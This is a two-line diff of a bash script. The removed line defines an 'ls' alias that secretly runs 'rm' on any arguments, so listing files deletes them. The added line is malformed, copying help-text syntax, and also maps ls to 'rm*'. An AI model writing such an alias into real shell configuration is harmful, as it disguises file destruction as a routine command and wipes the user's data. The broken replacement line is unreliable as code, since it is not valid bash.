@@ -1,2 +1,2 @@
 #!/bin/bash
-alias ls='function ls_func() { if [[ "$@" == "" ]]; then command ls; else command rm "$@"; fi; }; ls_func'
+alias [-p] [ls="rm*"]
